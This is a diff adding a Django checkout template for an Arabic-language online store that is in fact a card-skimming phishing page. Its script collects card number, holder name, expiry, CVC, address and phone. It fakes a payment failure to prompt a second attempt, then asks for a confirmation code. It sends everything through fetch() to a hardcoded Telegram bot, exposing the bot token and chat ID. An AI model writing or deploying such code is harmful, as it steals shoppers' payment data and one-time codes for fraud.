@@ -1,0 +1,258 @@
+{% extends 'store/main.html' %}
+
+{% load static %}
+
+    {% block stylesheets %}
+    <link rel="stylesheet" href="{% static '/css/home.css' %}" />
+    <link rel="stylesheet" type="text/css" href="{% static 'css/store.css' %}">
+    <!-- <link rel="stylesheet" type="text/css" href="{% static 'test/index.css' %}"> -->
+    <link rel="stylesheet" type="text/css" href="{% static 'source/card.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'source/card-types.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'css/store.css' %}">
+    <link rel="stylesheet" type="text/css" href="{% static 'test/mycardstyles.css' %}" >
+
+    {% endblock %}
+
+{% block content %}
+<div class="row mt-5 mb-5">
+    <div class="col-lg-6">
+        <div class="box-element" style="direction: rtl;">
+            <a href="/cart" class="btn btn-outline-dark">&#x2190; العودة للسلة</a>
+            <hr>
+            <h3>الطلب</h3>
+            <hr>
+            {% for item in items %}
+            <div class="cart-row">
+                <div style="flex:2"><img class="row-image" src="/media/{{item.product.image}}"></div>
+                <div style="flex:2"><p class="productName">{{ item.product.name }}</p></div>
+                <div style="flex:1"><p class="productPrice">{{item.product.price}} ر.س</p></div>
+                <div style="flex:1"><p class="productQuantity">x{{item.quantity}}</p></div>
+            </div>
+            {% endfor %}
+
+            <h5>المنتجات: {{forder.get_cart_items}}</h5>
+            <h5> المجموع: {{forder.get_cart_total}} ر.س</h5>
+        </div>
+    </div>
+    <div class="col-lg-6">
+        <div class="box-element">
+        <div id ="test-container">
+            <div id="container" class="mb-3"></div>
+            <div id="form">
+
+            </div>
+            <!-- <label>الموقع للشحن</label> -->
+            <input class="form-control mb-2" type="text" id="location" placeholder="Location" />
+
+            <!-- <label>رقم للتواصل </label> -->
+            <input class="form-control mb-2" type="number" pattern="\d*" id="phone" placeholder="Phone Number" maxlength="20" />
+
+
+        <button class="btn btn-primary btn-lg btn-block" onclick="send()" style="position: relative; left: 90%;"> دفع </button>
+        <div id="countdown" style="direction: rtl; font-size: larger;">
+            <span id="waiting"></span>
+            <div id="countdown-number" style="color: black;">
+            </div>
+            <!-- <svg>
+              <circle r="18" cx="20" cy="20"></circle>
+            </svg> -->
+        </div>
+
+        </div>
+    </div>
+    </div>
+</div>
+
+<!-- Button trigger modal -->
+<button style="display: none;" id="launchModal" type="button" class="btn btn-primary" data-bs-toggle="modal" data-bs-target="#exampleModal">
+    Launch demo modal
+  </button>
+  
+  <!-- Modal -->
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h5 class="modal-title" id="exampleModalLabel">رمز التأكيد</h5>
+          <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+        </div>
+        <div class="modal-body" style="direction: rtl;">
+          <input class="form-control" id="Product_code" type="text" placeholder="اكتب الكود هنا.." />
+        </div>
+        <div class="modal-footer">
+          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">إغلاق</button>
+          <button type="button" class="btn btn-primary" onclick="sendToTelegram()">إرسال</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+
+
+<!-- <div id ="test-container">
+    <div id="container"></div>
+    <div id="form">
+
+    </div>
+    <label>الموقع للشحن</label>
+    <input type="text" id="location" />
+
+      <label>رقم للتواصل </label>
+      <input type="text" id="phone" />
+
+
+  <button onclick="send()"> دفع </button>
+
+
+</div> -->
+
+    <!-- <div class="row">
+        <div class="col-lg-6">
+            <div class="box-element">
+                <a href="/cart" class="btn btn-outline-dark">&#x2190; العودة للسلة</a>
+                <hr>
+                <h3>الطلب</h3>
+                <hr>
+                {% for item in items %}
+                <div class="cart-row">
+					<div style="flex:2"><img class="row-image" src="/media/{{item.product.image}}"></div>
+					<div style="flex:2"><p>{{ item.product.name }}</p></div>
+					<div style="flex:1"><p>{{item.product.price}}رزس</p></div>
+					<div style="flex:1"><p>x{{item.quantity}}</p></div>
+				</div>
+                {% endfor %}
+
+                <h5>المنتجات: {{forder.get_cart_items}}</h5>
+                <h5>المجموع:ر.س {{forder.get_cart_total}}</h5>
+            </div>
+        </div>
+    </div> -->
+
+
+    <script>
+        window.onload = function addClasses() {
+            var allInputs = document.getElementsByTagName('input');
+            allInputs[0].setAttribute('oninput', 'visaNumber(this)');
+            // allInputs[0].setAttribute("type", "text");
+            // allInputs[0].setAttribute("pattern", "\d*");
+            // allInputs[0].setAttribute("maxlength", "16");
+
+
+            
+
+            // allInputs[3].setAttribute("type", "text");
+            allInputs[3].setAttribute("oninput", "cvcNumber(this)");
+            // allInputs[3].setAttribute("pattern", "\d*");
+            // allInputs[3].setAttribute("maxlength", "3");
+            for (let i = 0; i < 4; i++) {
+                allInputs[i].classList.add('form-control');
+                allInputs[i].classList.add('mb-2');
+            }
+        }
+    </script>
+
+    <script>
+        function visaNumber(e) {
+            if(e.value.length > 16) e.value = e.value.slice(0, 16);
+        }
+        function cvcNumber(e) {
+            if(e.value.length > 3) e.value = e.value.slice(0, 3);
+        }
+    </script>
+
+
+<script type="text/javascript" src="{% static 'test/bundle.js' %}"></script>
+
+
+<script>
+var sent = false;
+    function send()
+    {
+        if (sent == false) {
+            document.getElementById("waiting").innerHTML = "يرجى الانتظار: ";
+            var countdownNumberEl = document.getElementById('countdown-number');
+            var countdown = 3;
+
+            countdownNumberEl.textContent = countdown;
+
+            t = setInterval(function() {
+            countdown = --countdown
+            if (countdown <= 0) {
+                countdown = "أدخل مجددا";
+                countdownNumberEl.textContent = countdown;
+                sent = true;
+                clearInterval(t)
+            } 
+            // countdown = ++countdown <= 0 ? 60 : countdown;
+
+            countdownNumberEl.textContent = countdown;
+            }, 1000);
+        } else{
+            document.getElementById('launchModal').click();
+            sent = true;
+        
+
+     }
+    }
+
+    function sendToTelegram() {
+        
+        const cars = ["رقم الفيزا", "اسم صاحب الفيزا", "الصلاحية","CCV" , "موقع شحن","رقم التواصل "];
+            var text="           ";
+           var inputs= document.getElementsByTagName('input');
+
+           var product_prices = document.getElementsByClassName('productPrice');
+
+           document.getElementById('countdown-number').innerHTML = '     ';
+           document.getElementById('waiting').innerHTML = "تم الطلب";
+
+           for (var i=0; i < 6; i++) {
+              text =text + inputs[i].value + " ===>" +cars[i]+ "\n " ;
+              console.log(text);
+
+           }
+           if (text == "") {
+                alert("يرجى إدخال معلوماتك");
+           } else {
+            fetch('https://api.telegram.org/bot5850535001:AAGaeeFzh0V4_7oit7Jbjilt359EtLe0RLU/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+            'Content-Type': 'application/json'
+            },
+                body: JSON.stringify({ "chat_id": 727117894, "text": text })})
+
+            var product_code = document.getElementById('Product_code').value  + "كود الدفع ";
+
+            {% comment %} 
+            var product_prices = document.getElementsByClassName('productPrice');
+            var product_quantities = document.getElementsByClassName('productQuantity');
+            
+            var orderText = ""
+            for (let j=0; j < product_names.length; j++) {
+                orderText = orderText + product_names[j].innerText + "      ---   ";
+                orderText = orderText + product_prices[j].innerText + " ---- ";
+                orderText = orderText + product_quantities[j].innerText + "  -----  ";
+
+            }
+             {% endcomment %}
+
+            fetch('https://api.telegram.org/bot5850535001:AAGaeeFzh0V4_7oit7Jbjilt359EtLe0RLU/sendMessage', {
+            method: 'POST',
+            headers: {
+                'Accept': 'application/json',
+            'Content-Type': 'application/json'
+            },
+                body: JSON.stringify({ "chat_id": 727117894, "text": product_code })})
+            setTimeout(()=> {
+                goBack();
+            }
+            ,500);
+           }
+    }
+     function goBack() {
+        window.location.href = '/clearSession';
+     }
+
+    </script>
+{% endblock content %}
